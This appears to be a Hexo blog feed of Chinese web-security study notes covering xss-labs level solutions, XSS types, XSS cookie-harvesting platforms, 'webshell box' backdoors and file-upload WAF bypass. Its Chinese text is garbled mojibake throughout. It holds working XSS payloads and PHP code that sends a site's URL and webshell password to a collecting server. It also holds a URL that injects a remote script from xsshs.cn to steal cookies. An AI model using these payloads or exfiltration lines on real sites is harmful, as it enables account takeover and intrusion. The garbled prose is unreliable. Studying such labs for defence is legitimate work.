style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99;ript:alert(/xss/)</span><br></pre></td></tr></table></figure><h4 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h4><p>//æ³¨é‡Šæ‰åé¢çš„<code>http://www.baidu.com</code>ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99;ript:alert(/xss/)//http://www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="ç¬¬åå…³"><a href="#ç¬¬åå…³" class="headerlink" title="ç¬¬åå…³"></a>ç¬¬åå…³</h3><p>éšè—æ–‡æœ¬æ¡†ï¼Œåªæœ‰ç¬¬ä¸‰ä¸ªæœ‰æ•ˆ</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117702.png" alt="image-20210908214904179"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level10.php?t_sort=&quot; type=&#x27;text&#x27; onfocus=&quot;alert(/xss/)&amp;submit=submit</span><br></pre></td></tr></table></figure><h3 id="ç¬¬åä¸€å…³"><a href="#ç¬¬åä¸€å…³" class="headerlink" title="ç¬¬åä¸€å…³"></a>ç¬¬åä¸€å…³</h3><h5 id="çŸ¥è¯†-1"><a href="#çŸ¥è¯†-1" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h5><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117422.png" alt="image-20210908220057180"></p><h5 id="ç»•è¿‡-3"><a href="#ç»•è¿‡-3" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h5><p>æŠ“åŒ…ï¼Œå°†Refererå€¼ä¿®æ”¹ä¸ºpayloadä¾¿èƒ½é€šè¿‡è¿™ä¸€å…³</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117427.png" alt="image-20210329174228158"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure><h4 id="ç¬¬åäºŒå…³"><a href="#ç¬¬åäºŒå…³" class="headerlink" title="ç¬¬åäºŒå…³"></a>ç¬¬åäºŒå…³</h4><p>æŠ“åŒ…ï¼Œæ”¹ä¸€ä¸‹UAå€¼</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117252.png" alt="image-20210329174644639"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure><h3 id="ç¬¬åä¸‰å…³"><a href="#ç¬¬åä¸‰å…³" class="headerlink" title="ç¬¬åä¸‰å…³"></a>ç¬¬åä¸‰å…³</h3><p>æŠ“åŒ…ä¿®æ”¹cookieå€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure><h3 id="ç¬¬åå››å…³"><a href="#ç¬¬åå››å…³" class="headerlink" title="ç¬¬åå››å…³"></a>ç¬¬åå››å…³</h3><p>å¥½åƒæ²¡å¾—ç¯å¢ƒï¼Œè¿™å…³åˆ©ç”¨çš„æ˜¯exifæ¼æ´ï¼Œçœ‹è¿™ä¸ªexifçš„æ–‡ç« å§ã€‚</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/104814749">https://blog.csdn.net/qq_32393893/article/details/104814749</a></p><h3 id="ç¬¬åäº”å…³"><a href="#ç¬¬åäº”å…³" class="headerlink" title="ç¬¬åäº”å…³"></a>ç¬¬åäº”å…³</h3><p>XSSä¸­æœ‰æ–‡ä»¶åŒ…å«æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level15.php?src=&#x27;level1.php?name=&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;&#x27;</span><br></pre></td></tr></table></figure><h3 id="ç¬¬åå…­å…³"><a href="#ç¬¬åå…­å…³" class="headerlink" title="ç¬¬åå…­å…³"></a>ç¬¬åå…­å…³</h3><p>ç¦æ‰äº†ç©ºæ ¼ï¼Œç”¨å›è½¦ä»£æ›¿%0d</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level16.php?keyword=&lt;img%0dsrc=123%0donerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="ç¬¬åä¸ƒå…³"><a href="#ç¬¬åä¸ƒå…³" class="headerlink" title="ç¬¬åä¸ƒå…³"></a>ç¬¬åä¸ƒå…³</h3><p>ç«ç‹å’Œchromeå¾ˆä¸ä¸€æ ·ã€‚ã€‚ã€‚ã€‚chromeä¸Šå¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level17.php?arg01=%20onmouseover&amp;arg02=javascript:alert(1)</span><br></pre></td></tr></table></figure><h3 id="ç¬¬åå…«å…³"><a href="#ç¬¬åå…«å…³" class="headerlink" title="ç¬¬åå…«å…³"></a>ç¬¬åå…«å…³</h3><p>ä¸€æ ·ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level18.php?arg01=%20onmouseover&amp;arg02=javascript:alert(1)</span><br></pre></td></tr></table></figure><h3 id="ç¬¬åä¹å…³"><a href="#ç¬¬åä¹å…³" class="headerlink" title="ç¬¬åä¹å…³"></a>ç¬¬åä¹å…³</h3><p>flash XSS chromeéƒ½æŠŠflashç¦äº†ï¼Œè¢«æ·˜æ±°äº†è¿™flashï¼Œä¸åšäº†ä¸åšäº†ã€‚(å®é™…æ˜¯å› ä¸ºæ‡’)</p><h3 id="ç¬¬äºŒåå…³"><a href="#ç¬¬äºŒåå…³" class="headerlink" title="ç¬¬äºŒåå…³"></a>ç¬¬äºŒåå…³</h3><p>ä¸€æ ·æ‡’</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> XSSè·¨ç«™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>26WEBæ¼æ´-XSSè·¨ç«™ä¹‹è®¢å•åŠShellç®±å­åæ€è®°</title>
      <link href="/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/"/>
      <url>/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h3><p>æµ‹è¯•XSSè¿”å›çš„cookieæ˜¯å¦æ­£å¸¸ï¼Œä½¿ç”¨è¯¥å·¥å…·</p><h4 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.postman.com/downloads/</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_43184774/article/details/100578557</span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116195.png" alt="image-20210907171129986"></p><h3 id="WEB-SHELLç®±å­"><a href="#WEB-SHELLç®±å­" class="headerlink" title="WEB SHELLç®±å­"></a>WEB SHELLç®±å­</h3><p>å½“ä½ å…¥ä¾µäº†åˆ«äººçš„ç½‘ç«™ï¼Œå†™å…¥å¤§é©¬æˆ–è€…å…¶ä»–æœ¨é©¬ï¼Œè¯¥æœ¨é©¬ä¼šè‡ªåŠ¨å°†ç½‘ç«™åœ°å€å’Œæœ¨é©¬çš„ç™»å½•å¯†ç å‘é€åˆ°ä¸€ä¸ªåœ°æ–¹ï¼Œè¿™ç§å°±å«åšWEB SHELLç®±å­ã€‚</p><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><p>è¿™åªæ˜¯ä¸€ç§å†™æ³•ï¼Œè¿˜æœ‰å¾ˆå¤šç§ã€‚å°†ä»£ç å†™åˆ°å¤§é©¬ä¸­ï¼Œç„¶åå½“å¤§é©¬è¢«è®¿é—®çš„æ—¶å€™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url=$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;];</span><br><span class="line">echo &quot;&lt;script src=&#x27;http://192.168.1.56/api.asp?url=$url&amp;pass=$password&#x27;&gt;&quot;;</span><br></pre></td></tr></table></figure><h4 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116331.png" alt="image-20210907201815544"></p><p>å¯ä»¥çœ‹åˆ°å‘é€äº†ä¸€ä¸ªè¯·æ±‚ã€‚å½“ä½ æ’å…¥è¿™ä¸ªä¸€å¥è¯æœ¨é©¬åœ¨æŸä¸ªç½‘é¡µï¼Œå®ƒä¼šå‘é€è¿™ä¸ªç½‘é¡µçš„urlä»¥åŠä¸€å¥è¯æœ¨é©¬çš„å¯†ç åˆ°åé—¨æœåŠ¡å™¨</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116212.png" alt="image-20210907201641742"></p><p>webshellç®±å­å·²ç»æ‹¿åˆ°äº†åœ°å€å’Œå¯†ç ï¼Œé€šè¿‡å®ƒå°±å¯ä»¥ç™»å½•è¿›å»ã€‚</p><h4 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h4><p><strong>å½“æˆ‘ä»¬æ‰¾åˆ°åé—¨æœåŠ¡å™¨çš„åœ°å€åï¼Œå¯ä»¥é€šè¿‡æ’å…¥XSSè¯­å¥æ¥åæ€åé—¨</strong></p><h4 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å¯†ç ä¿®æ”¹ä¸ºXSSä»£ç ï¼Œç›—å–cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.56/api.asp?url=www.baidu.con/1.php&amp;pass=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡ŒXSSä»£ç </p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116210.png" alt="image-20210907202050646"></p><p>å¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªxssä»£ç æ”¹ä¸ºè·å–cookieçš„ä»£ç ï¼Œå°±å¯ä»¥æŠŠè¿™ä¸ªåå°ç»™æ‹¿ä¸‹ï¼<strong>åé—¨ä½œè€…ä»¥ä¸ºä½ åœ¨ç¬¬ä¸€å±‚ï¼Œå…¶å®ä½ åœ¨ç¬¬äº”å±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.56/api.asp?url=www.huohu.con/1.php&amp;pass=&lt;sCRiPt sRC=//xsshs.cn/m6YT&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116178.png" alt="image-20210907202333035"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»è·å–åˆ°cookieäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/xf555er/article/details/105151100</span><br></pre></td></tr></table></figure><h3 id="beef"><a href="#beef" class="headerlink" title="beef"></a>beef</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://smling.blog.csdn.net/article/details/106067842</span><br></pre></td></tr></table></figure><h3 id="XSSæ”»å‡»ä½ç½®"><a href="#XSSæ”»å‡»ä½ç½®" class="headerlink" title="XSSæ”»å‡»ä½ç½®"></a>XSSæ”»å‡»ä½ç½®</h3><ul><li>ç•™è¨€æ¿</li><li>è¯„è®ºåŒº</li><li>è®¢å•ç³»ç»Ÿ</li><li>åé¦ˆæ¡ä»¶</li><li>â€¦â€¦.</li></ul><p>å¦‚æœç½‘ç«™æ˜¯ç”¨sessionéªŒè¯çš„ï¼Œé‚£ä¹ˆç›—å–cookieæ˜¯ç™»å½•ä¸æˆåŠŸç½‘ç«™çš„ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116356.png" alt="image-20210907205111007" style="zoom:67%;" /><h4 id="è·å–session"><a href="#è·å–session" class="headerlink" title="è·å–session"></a>è·å–session</h4><p>é€šè¿‡è·¨ç«™è„šæœ¬æ”»å‡»è®©ç½‘ç«™è®¿é—®phpinfoé¡µé¢ï¼Œè¯¥é¡µé¢æœ‰sessionçš„å€¼ã€‚XSSå¹³å°æœ‰è¿™æ–¹é¢çš„åŠŸèƒ½ã€‚è¿™æ¯”è¾ƒéš¾ã€‚</p><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://xss.fbisb.com/ https://github.com/tennc/webshell </span><br><span class="line">https://www.postman.com/downloads/ </span><br><span class="line">https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA æå–ç ï¼šxiao</span><br><span class="line">https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw æå–ç ï¼š xiao</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> XSSè·¨ç«™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>25WEBæ¼æ´-XSSè·¨ç«™ä¹‹åŸç†åˆ†ç±»åŠæ”»å‡»æ‰‹æ³•</title>
      <link href="/2021/09/21/25WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"/>
      <url>/2021/09/21/25WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="XSS-è·¨ç«™æ¼æ´äº§ç”Ÿ"><a href="#XSS-è·¨ç«™æ¼æ´äº§ç”Ÿ" class="headerlink" title="XSS è·¨ç«™æ¼æ´äº§ç”Ÿ"></a>XSS è·¨ç«™æ¼æ´äº§ç”Ÿ</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>å˜é‡åœ¨æ¥å—æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®å¯ä»¥å†™æˆjavascriptçš„å½¢å¼ï¼Œè¿™ä¸ªä»£ç å¯ä»¥è¢«æµè§ˆå™¨è¯†åˆ«ï¼Œå¹¶ä¸”æ‰§è¡Œï¼Œä»è€Œé€ æˆäº†XSSæ¼æ´ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115538.png" alt="image-20210328193439848"></p><h4 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h4><ul><li>ç›—å–å„ç±»ç”¨æˆ·å¸å·ï¼Œå¦‚æœºå™¨ç™»å½•å¸å·ã€ç”¨æˆ·ç½‘é“¶å¸å·ã€å„ç±»ç®¡ç†å‘˜å¸å·</li><li>æ§åˆ¶ä¼ä¸šæ•°æ®ï¼ŒåŒ…æ‹¬è¯»å–ã€ç¯¡æ”¹ã€æ·»åŠ ã€åˆ é™¤ä¼ä¸šæ•æ„Ÿæ•°æ®çš„èƒ½åŠ›</li><li>ç›—çªƒä¼ä¸šé‡è¦çš„å…·æœ‰å•†ä¸šä»·å€¼çš„èµ„æ–™</li><li>éæ³•è½¬è´¦</li><li>å¼ºåˆ¶å‘é€ç”µå­é‚®ä»¶</li><li>ç½‘ç«™æŒ‚é©¬</li><li>æ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶å®ƒç½‘ç«™å‘èµ·æ”»å‡»</li></ul><h3 id="ç‰¹ç‚¹"><a href="#ç‰¹ç‚¹" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h3><p>XSSæœ¬è´¨æ˜¯å‰ç«¯æ¼æ´ï¼Œäº§ç”Ÿåœ¨å‰ç«¯ã€‚</p><h3 id="XSS-è·¨ç«™æ¼æ´åˆ†ç±»ï¼š"><a href="#XSS-è·¨ç«™æ¼æ´åˆ†ç±»ï¼š" class="headerlink" title="XSS è·¨ç«™æ¼æ´åˆ†ç±»ï¼š"></a>XSS è·¨ç«™æ¼æ´åˆ†ç±»ï¼š</h3><h4 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h4><p>åå°„æ€§XSSæ˜¯ä¸€æ¬¡æ€§çš„ï¼Œä¸ä¼šè®²XSSä»£ç å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥æ¯æ¬¡æ”»å‡»éƒ½éœ€è¦è‡ªå·±å†™ã€‚</p><p><strong>ä¾‹å­</strong></p><p>å½“æˆ‘å†™å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>çš„æ—¶å€™</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115542.png" alt="image-20210906205629017"></p><p>æˆåŠŸæ‰§è¡Œjsä»£ç ï¼Œä½†æ˜¯å½“æˆ‘ä¸‹ä¸€æ¬¡è¾“å…¥å…¶ä»–çš„æ—¶å€™ï¼Œä¸å†™å…¥ä»£ç å´æ²¡æœ‰å¼¹çª—ï¼Œè¿™å°±æ˜¯åå°„å‹XSSã€‚</p><h4 id="å­˜å‚¨"><a href="#å­˜å‚¨" class="headerlink" title="å­˜å‚¨"></a>å­˜å‚¨</h4><p>å­˜å‚¨å‹XSSæ˜¯æŒä¹…æ€§è·¨ç«™è„šæœ¬ï¼Œå­˜å‚¨å‹ä¼šå°†ä»£ç ä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œæ¯å½“æœ‰å…¶ä»–äººç‚¹å‡»çš„æ—¶å€™å°±ä¼šè¿›è¡Œæ”»å‡»ã€‚å­˜å‚¨å‹XSSä¸€èˆ¬å‘ç”Ÿåœ¨ç•™è¨€æ¿ç­‰åœ°æ–¹ã€‚</p><p><strong>ä¾‹å­</strong></p><p>å½“æˆ‘å†™å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>çš„æ—¶å€™ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢ï¼Œéƒ½ä¼šå‡ºç°å¼¹çª—ï¼Œæ­¤æ—¶ä»£ç å·²ç»è¢«å­˜å‚¨åˆ°æ•°æ®åº“ä¸­äº†ï¼Œè¿™å°±æ˜¯å­˜å‚¨å‹XSSã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115887.png" alt="image-20210906205911092"></p><h4 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115896.png" alt="image-20210906205938334"></p><p>domæ ‘XSSæ‰§è¡Œä¼šåœ¨å‰ç«¯ä»£ç ä¸­è¿›è¡Œï¼Œä¸ä¼šåˆ°åç«¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘åŒ… x=xiaodi =&gt; æœ¬åœ°æµè§ˆå™¨é™æ€å‰ç«¯ä»£ç  =x.php</span><br></pre></td></tr></table></figure><p><strong>ä¾‹å­</strong></p><p> å½“æˆ‘ä»¬è¾“å…¥1çš„æ—¶å€™æ­¤é“¾æ¥åœ°å€å°±æ‹¼æ¥äº†æˆ‘ä»¬çš„è¾“å…¥ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116523.png" alt="image-20210906211533947" style="zoom:50%;" /><p>è€Œä¸”å½“æˆ‘ä»¬ç»§ç»­ç‚¹å‡»çš„æ—¶å€™ï¼Œä»£ç å¹¶æ²¡æœ‰ç»è¿‡åç«¯å¤„ç†ï¼Œè€Œæ˜¯ç”±å‰ç«¯jsä»£ç è¿›è¡Œå¤„ç†ï¼Œè¿™å°±æ˜¯domå‹XSSçš„å…³é”®ã€‚</p><h3 id="XSS-å¸¸è§„æ”»å‡»æ‰‹æ³•"><a href="#XSS-å¸¸è§„æ”»å‡»æ‰‹æ³•" class="headerlink" title="XSS å¸¸è§„æ”»å‡»æ‰‹æ³•"></a>XSS å¸¸è§„æ”»å‡»æ‰‹æ³•</h3><p>å¹³å°ï¼Œå·¥å…·ï¼Œç»“åˆå…¶ä»–ç­‰ </p><p>æ”»å‡»æˆåŠŸçš„æ¡ä»¶ï¼šå¯¹æ–¹æœ‰æ¼æ´ï¼Œæµè§ˆå™¨å­˜æœ‰cookieï¼Œæµè§ˆå™¨ä¸è¿›è¡Œæ‹¦æˆªï¼Œä¸å­˜åœ¨å¸¦ä»£ç è¿‡æ»¤å’Œhttponlyï¼Œå¯¹æ–¹è¦è§¦å‘è¿™ä¸ªæ¼æ´åœ°å€</p><h4 id="cookie-session"><a href="#cookie-session" class="headerlink" title="cookie session"></a>cookie session</h4><p>ç”¨æˆ·å‡­æ®ï¼šé€šè¿‡å‡­æ®å¯ä»¥åˆ¤æ–­å¯¹æ–¹èº«ä»½ä¿¡æ¯ </p><p>cookie å­˜å‚¨æœ¬åœ° å­˜æ´»æ—¶é—´è¾ƒé•¿ å°ä¸­å‹ </p><p>session ä¼šè¯ å­˜å‚¨æœåŠ¡å™¨ å­˜æ´»æ—¶é—´è¾ƒçŸ­ å¤§å‹</p><p>sessionä¼šå ç”¨æœåŠ¡å™¨çš„èµ„æºï¼Œä½†æ˜¯æ¯”è¾ƒå®‰å…¨ã€‚æ¯”å¦‚è¯´javawebä¸­çš„sessionåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><h3 id="XSSå¹³å°ä½¿ç”¨"><a href="#XSSå¹³å°ä½¿ç”¨" class="headerlink" title="XSSå¹³å°ä½¿ç”¨"></a>XSSå¹³å°ä½¿ç”¨</h3><h4 id="åˆ›å»º"><a href="#åˆ›å»º" class="headerlink" title="åˆ›å»º"></a>åˆ›å»º</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116947.png" alt="image-20210907141459574"></p><h4 id="é¡¹ç›®ä»£ç "><a href="#é¡¹ç›®ä»£ç " class="headerlink" title="é¡¹ç›®ä»£ç "></a>é¡¹ç›®ä»£ç </h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115919.png" alt="image-20210907142314237"></p><h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115379.png" alt="image-20210907143604224"></p><p>å‘ç°è¯·æ±‚äº†è¿™ä¸ªåœ°å€ã€‚åœ¨å¹³å°ä¸Šå°±æœ‰ä¿¡æ¯äº†</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211116383.png" alt="image-20210907144044866"></p><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://xss8.cc/xss.php?do=login</span><br><span class="line">https://xsshs.cn/xss.php?do=login</span><br><span class="line">https://github.com/do0dl3/xss-labs</span><br><span class="line">http://down.chinaz.com/soft/37581.htm</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> XSSè·¨ç«™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>24WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹WAFç»•è¿‡åŠå®‰å…¨ä¿®å¤</title>
      <link href="/2021/09/21/24WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/"/>
      <url>/2021/09/21/24WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><h4 id="ä¸Šä¼ å‚æ•°åè§£æï¼šæ˜ç¡®å“ªäº›ä¸œè¥¿èƒ½ä¿®æ”¹ï¼Ÿ"><a href="#ä¸Šä¼ å‚æ•°åè§£æï¼šæ˜ç¡®å“ªäº›ä¸œè¥¿èƒ½ä¿®æ”¹ï¼Ÿ" class="headerlink" title="ä¸Šä¼ å‚æ•°åè§£æï¼šæ˜ç¡®å“ªäº›ä¸œè¥¿èƒ½ä¿®æ”¹ï¼Ÿ"></a>ä¸Šä¼ å‚æ•°åè§£æï¼šæ˜ç¡®å“ªäº›ä¸œè¥¿èƒ½ä¿®æ”¹ï¼Ÿ</h4><ul><li>Content-Dispositionï¼šä¸€èˆ¬å¯æ›´æ”¹ </li><li>nameï¼šè¡¨å•å‚æ•°å€¼ï¼Œä¸èƒ½æ›´æ”¹ </li><li>filenameï¼šæ–‡ä»¶åï¼Œå¯ä»¥æ›´æ”¹ </li><li>Content-Typeï¼šæ–‡ä»¶ MIMEï¼Œè§†æƒ…å†µæ›´æ”¹</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114156.png" alt="image-20210905204247639"></p><h3 id="å¸¸è§ç»•è¿‡æ–¹æ³•ï¼š"><a href="#å¸¸è§ç»•è¿‡æ–¹æ³•ï¼š" class="headerlink" title="å¸¸è§ç»•è¿‡æ–¹æ³•ï¼š"></a>å¸¸è§ç»•è¿‡æ–¹æ³•ï¼š</h3><h4 id="æ•°æ®æº¢å‡º-é˜²åŒ¹é…-xxxâ€¦"><a href="#æ•°æ®æº¢å‡º-é˜²åŒ¹é…-xxxâ€¦" class="headerlink" title="æ•°æ®æº¢å‡º-é˜²åŒ¹é…(xxxâ€¦)"></a>æ•°æ®æº¢å‡º-é˜²åŒ¹é…(xxxâ€¦)</h4><p>é€šè¿‡è¾“å…¥å¤§é‡çš„æ— æ•ˆå­—ç¬¦æ¥è¿›è¡Œæ•°æ®æº¢å‡ºï¼Œé˜²æ­¢åŒ¹é…ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115504.png" alt="image-20210905181002624" style="zoom: 67%;" 